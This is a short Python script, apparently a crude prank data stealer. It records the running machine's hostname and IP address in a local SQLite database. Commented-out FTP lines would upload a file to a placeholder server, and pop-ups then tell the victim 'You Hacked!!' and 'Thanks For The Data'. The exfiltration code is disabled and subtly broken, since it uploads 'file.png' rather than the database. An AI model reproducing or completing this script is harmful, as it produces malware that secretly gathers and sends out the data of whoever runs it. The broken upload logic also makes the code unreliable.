import ftplib
import socket
import sqlite3
from tkinter import messagebox
import random

hostname = socket.gethostname()
IPAddress = socket.gethostbyname(hostname)
print(hostname)
print(IPAddress)
numbers = "1234567890"

conn = sqlite3.connect('database.db')
c = conn.cursor()
c.execute('CREATE TABLE IF NOT EXISTS data(ip TEXT, hostname TEXT)')
c.execute("INSERT INTO data(ip, hostname) VALUES(?, ?)", [IPAddress, hostname])
conn.commit()
c.close()
conn.close()

#session = ftplib.FTP('server.address.com','username','password')
#file = open('file.png','rb')
randnum = randompassword = ( ''.join(random.choices(numbers, k=20)))
print('STOR database' + randnum + '.db')
#session.storbinary('STOR database' + randnum + '.db', file)
#file.close()
#session.quit()

messagebox.showinfo("You Hacked!!", "You Hacked hahahahahahah")
messagebox.showinfo("You Hacked!!", "Thanks For The Data hahaha")
